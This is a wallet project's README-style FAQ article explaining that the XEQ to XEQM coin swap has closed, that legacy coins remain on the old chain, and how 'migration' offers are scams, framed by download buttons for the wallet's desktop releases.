![XEQM WALLET](assets/banner-article.png)

# Is the XEQ swap to XEQM open

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows" /> | Windows 10 or 11, 64-bit | [`XEQM-GUI-2.3.6-win.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe) |
| <img src="https://img.shields.io/badge/macOS-1371E6?style=flat-square&logo=apple&logoColor=white" alt="macOS" /> | macOS, Apple Silicon | [`XEQM-GUI-2.3.6-mac.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg) |
| <img src="https://img.shields.io/badge/Linux-1371E6?style=flat-square&logo=linux&logoColor=white" alt="Linux" /> | x64 Linux, AppImage | [`XEQM-GUI-2.3.6-linux.AppImage`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage) |

</div>


All versions and checksums are on the [XEQM WALLET release page](https://github.com/XEQMFoundation/XEQM-Wallet/releases/tag/v2.3.6).

Requirements follow the platforms the release ships assets for. No minimum OS build or disk figure is published for this tag.

> Only download from this GitHub release page.

No. The XEQ to XEQM swap has closed. It ran as a fixed production window in which legacy XEQ was burned and the equivalent XEQM minted, and the window is over  -  there is no open form, no queue and no route to submit a new claim. Pages that still describe it as running are describing something that has finished.

## Why the question keeps coming up

Old threads, cached pages and third-party articles outlive the thing they describe. A guide written during the swap window reads exactly like a guide written after it, because nothing in the text changes when the deadline passes.

The result is a steady trickle of people who believe they missed a step rather than a window. The distinction matters: a missed step is fixable, and a closed window is not.

## What "closed" means in practice

The swap was a one-way process: burn on the legacy chain, mint on the current one. Once the window closed, no further burns were accepted for conversion, and the minting side stopped issuing for new claims.

So the state is not "paused" or "under maintenance". It is finished, and the honest answer to "can I still do it" is the one at the top of this page. [Migrate from XEQ to XEQM](https://github.com/XEQMFoundation/custody-and-protection/blob/main/migrating-from-xeq-to-xeqm.md) covers how it worked.

## The coins themselves are not gone

Closing the window did not delete legacy XEQ. It remains on the legacy chain, in the wallets that hold it, visible to anyone who looks at that chain.

What is gone is the official route that would have converted it. A holder today has a legacy asset, not a claim on the current one. That is a real loss of opportunity and not a loss of the coins themselves.

## What to do instead

If you hold legacy XEQ, there is no official migration left, and no service that can perform one. Do not send coins to anyone offering to convert them, and do not share the legacy wallet's key or seed with a "migration desk".

If you hold XEQM, nothing here applies to you. The current wallet creates and restores wallets on the current chain, and it has no migration screen at all.

## Why the wallet does not mention it

XEQM WALLET is built for the chain that exists now. Its wallet-select screen offers create, restore, import and view-only  -  the four routes into a current wallet  -  and none of them involves a burn.

That absence is a feature of a finished process rather than an oversight. A wallet that still carried a migration tab would be advertising something that cannot happen. [What is XEQM WALLET](https://github.com/XEQMFoundation/account-guide/blob/main/what-is-xeqm-wallet.md) covers what it does carry.

## The pages that disagree, and how to read them

Some official-looking material still presents the swap as available, because it was written while it was. The resolution is not to compare pages until one looks newer, but to look at what can actually be done: is there a form, does it accept a submission, does anything confirm a mint?

If the answer is no, the window is closed regardless of what a page says. [Which XEQM site is official](https://github.com/XEQMFoundation/custody-and-protection/blob/main/which-xeqm-site-is-official.md) covers the wider naming problem, which is the same problem in a different costume.

## Why a closed swap is not a paused one

A paused process has a state to resume from and somebody who can resume it. A closed window has neither: the claims that were submitted were processed, and the ones that were not never will be.

That is why the wording matters when you read old material. "Still processing" described individual claims inside the window; it never described a window that would accept new ones afterwards.

The distinction is also why no amount of waiting changes the answer. Waiting is for a queue, and there is no queue.

## What a holder can still do

Very little, and that is the honest position. The legacy coins can be held, moved on the legacy chain and recorded for accounting, and none of that turns them into current XEQM.

What a holder should not do is spend money trying. Fees to a "migration desk", deposits to unlock a claim, or a payment for priority processing all buy nothing, because the thing being sold does not exist.

## What unclaimed XEQ means for supply

Coins that were never migrated were never burned, so they never became XEQM. The current chain's supply is the product of what was actually migrated and what the network has issued since, which is why a figure quoted for the current chain is not the legacy chain's supply.

This is background rather than something a holder can act on. [How many XEQM coins exist](https://github.com/XEQMFoundation/account-guide/blob/main/how-many-xeqm-coins-exist.md) covers the current numbers and why they are checkable on chain.

## What a scam looks like here

A closed migration is fertile ground for offers: a "recovery service" that will migrate your old coins for a fee, a portal that asks you to connect a wallet and sign, a Telegram account that will "check your address" if you send the seed.

Every one of them wants the same thing. A closed process cannot be reopened by a stranger, and a stranger who says otherwise is describing the theft rather than the service. [How to spot XEQM phishing](https://github.com/XEQMFoundation/custody-and-protection/blob/main/how-to-spot-xeqm-phishing.md) covers the shapes.

## If you think you submitted during the window

The swap portal published a status per claim, and the two states people saw were a claim that had expired and would be resubmitted by the backend, and a claim rejected for an invalid proof that had to be regenerated.

Those states belong to the window, so a claim from that period is a historical record rather than something to act on now. [XEQM swap status expired](https://github.com/XEQMFoundation/custody-and-protection/blob/main/xeqm-swap-status-expired.md) explains what the statuses meant.

## What to tell someone who insists it is open

Ask them to show you a submission that was accepted after the window closed. There is no such thing, and the request moves the conversation from assertion to evidence.

If they are selling something, stop there. [Can I cancel an XEQM transaction](https://github.com/XEQMFoundation/account-guide/blob/main/can-i-cancel-an-xeqm-transaction.md) is a reminder of the wider principle: in this system, a transaction already made cannot be undone, which is why the offers to undo one are always fraud.

## Why the answer does not depend on who you ask

A closed window is a fact about a process, not a matter of opinion, so asking in three places produces the same answer three times: no form accepts a claim. Anyone who disagrees is describing something other than the migration.

That is why the question is worth settling with a check rather than a conversation. Look for the process; if there is none, the answer is no.

## What a reopened window would require

Reopening would mean a new minting process, a new public record and a new announcement from the project  -  three things that do not exist, and none of which a third party can supply.

That is a useful test for any claim you encounter. Ask which of the three exists. A reopened swap without a published process is a story, and a story with a fee attached is a scam.

## Frequently asked questions

### Is the XEQ swap still accepting claims?

No. The window has closed and no new claim can be submitted.

### Will it reopen?

No announcement of a reopening exists, and nothing on the current site or repository describes one. Treat "it will reopen" as a claim without support.

### Can I convert legacy XEQ another way?

There is no official route and no service that can do it. Offers to convert it for a fee are attempts to obtain the coins or the key.

### Did I lose my legacy coins?

They are still on the legacy chain. What closed was the conversion route, not the coins.

---

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

## Related guides

- [Migrate from XEQ to XEQM](https://github.com/XEQMFoundation/custody-and-protection/blob/main/migrating-from-xeq-to-xeqm.md)
- [XEQ history does not migrate](https://github.com/XEQMFoundation/custody-and-protection/blob/main/xeqm-swap-history-not-migrated.md)
- [XEQM swap status expired](https://github.com/XEQMFoundation/custody-and-protection/blob/main/xeqm-swap-status-expired.md)
